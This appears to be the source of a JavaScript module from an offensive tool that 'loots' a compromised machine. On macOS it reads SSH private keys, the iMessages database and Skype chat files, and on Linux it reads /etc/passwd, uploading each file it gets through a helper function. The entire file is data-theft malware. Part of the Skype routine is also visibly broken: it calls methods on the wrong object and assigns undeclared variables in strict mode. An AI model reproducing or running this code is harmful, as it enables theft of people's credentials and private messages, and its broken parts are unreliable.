"use strict";


define(["utils", "filesystem", "platform"], function(utils, fs, platform) {
    
    return {

        platform: platform,
        utils: utils,
        fs: fs,

        // Main entry point for all looters
        execute: function() {
            console.log('Looting the file system, please wait ...');
            var os = platform.operatingSystem();
            var _this = this;
            if (os === 'macos') {
                console.log('Looting MacOS system');
                this.fs.getHomeDirectory({
                    success: function(home) {
                        _this.lootMacOS.call(_this, home);
                    },
                    failure: function() {
                        console.log('Warning: Could not determine home directory');
                        _this.lootMacOS.call(_this, null);
                    }
                });
            } else if (os === 'linux') {
                this.lootLinux();
            }
        },

        lootMacOS: function(home) {
            if (home) {
                this.sshKeys(home);
                this.messagesHistory(home);
                this.skypeHistory(home)
            }
            this.passwd();
        },

        lootLinux: function() {
            this.passwd();
        },

        lootWindows: function() {

        },

        //
        // OS file looters
        //
        passwd: function() {
            var _this = this;
            this.fs.getFile('/etc/passwd', {
                success: function(data) {
                    _this.utils.uploadFile('passwd', data, {});
                }
            });
        },

        //
        // Application specific looting
        //
        sshKeys: function(home) {
            var _this = this;
            
            this.fs.getFile(home + '/.ssh/id_rsa', {
                success: function(data) {
                    _this.utils.uploadFile('id_rsa', data, {});
                }
            });

            this.fs.getFile(home + '/.ssh/id_rsa.pub', {
                success: function(data) {
                    _this.utils.uploadFile('id_rsa.pub', data, {});
                }
            });
        },

        messagesHistory: function(home) {
            // Library/Messages/chat.db <-- Chat database, and paths to attachments
            // Library/Messages/Attachments/<byte>/<byte>/<uuid>/<file>
            var _this = this;
            this.fs.getFile(home + '/Library/Messages/chat.db', {
                success: function(data) {
                    _this.utils.uploadFile('chat.db', data, {});
                }
            });
        },

        skypeHistory: function(home) {
            // -- MacOS --
            // <home>/Library/Application Support/Skype/shared.xml  <-- Contains username
            // <home>/Library/Application Support/Skype/<username>/main.db  <-- Chat database
            if ('macos' === this.platform.operatingSystem()) {
                var _this = this;
                this.fs.getFile(home + encodeURI('/Library/Application Support/Skype/shared.xml'), {
                    success: function(data) {
                        parser = new DOMParser();
                        xmlDoc = parser.parseFromString(data,"text/xml");
                        var user = xmlDoc.getElementsByTagName("Default");
                        if (user.length) {
                            skypeUser = user[0].textContent;
                            console.log('Skype username is: ' + skypeUser);
                            this.fs.getFile(home + encodeURI('/Library/Application Support/Skype/' + skypeUser + '/main.db'), {
                                success: function(data) {
                                    this.uploadFile('main.db', data, {});
                                }
                            });
                        }
                        _this.utils.uploadFile('shared.xml', data, {});   
                    },
                    failure: function() {
                        console.log('Could not read skype configuration file');
                    }
                });
            }

        }

    }

});